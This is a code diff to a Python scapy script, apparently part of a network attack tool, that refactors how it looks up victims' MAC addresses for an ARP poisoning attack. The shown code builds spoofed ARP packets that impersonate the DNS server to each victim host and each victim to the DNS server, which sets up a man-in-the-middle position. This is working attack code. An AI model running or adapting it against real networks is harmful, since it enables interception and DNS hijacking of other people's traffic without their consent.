@@ -3,6 +3,7 @@ import os
 from scapy.all import *
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 from environment import *
+from mac_management import *
 import ipaddress
 
 def arp():
@@ -36,16 +37,15 @@ def arp():
 	for victim in victims.hosts():
 
 		# Get the victim MAC address
-		arp_resolver_package_victim = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(victim))
-		mac_victim = srp(arp_resolver_package_victim, timeout=2, verbose=False)
+		# arp_resolver_package_victim = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(victim))
+		# mac_victim = srp(arp_resolver_package_victim, timeout=2, verbose=False)
 
-		print(mac_victim[0])
+		mac_victim = get_MAC(str(victim))
+
+		if(mac_victim != False):
 		
-		# If mac addr is not found then consider that victim is offline, don't treat the victim
-		# Else add spoofed packets (DNS --> Victim and Victim --> DNS)
-		if mac_victim[0]:
-			mac_victim = mac_victim[0][0][1].hwsrc
-
+			# If mac addr is not found then consider that victim is offline, don't treat the victim
+			# Else add spoofed packets (DNS --> Victim and Victim --> DNS)
 			#creation of ARP poisoning packets
 			p1 = Ether(dst=mac_victim) / ARP(op=1, hwsrc=self_mac, psrc=ATTACK_STATUS['dns'], hwdst="00:00:00:00:00:00", pdst=str(victim));
 			p2 = Ether(dst=mac_dns) / ARP(op=1, hwsrc=self_mac, psrc=str(victim), hwdst="00:00:00:00:00:00", pdst=ATTACK_STATUS['dns']);
